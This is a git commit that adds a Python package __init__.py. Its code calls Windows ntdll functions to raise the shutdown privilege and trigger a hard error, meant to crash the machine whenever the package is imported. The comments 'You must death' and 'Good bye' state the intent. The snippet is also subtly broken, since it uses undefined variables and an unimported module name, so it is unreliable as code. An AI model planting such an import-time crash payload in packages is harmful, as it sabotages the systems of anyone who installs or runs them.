11f22523c1b3e921fe13c24c98e00524d46b4413
lap1sid <48173871+lap1sid@users.noreply.github.com>
2020-01-07 15:26:02 +0900

    Create __init__.py

---
+++ __init__.py
@@ -0,0 +1,10 @@
+# You must death
+
+# Good bye
+
+from ctypes import *
+from ctypes.wintypes import *
+var1 = c_bool()
+var2 = DWORD()
+ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
+ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
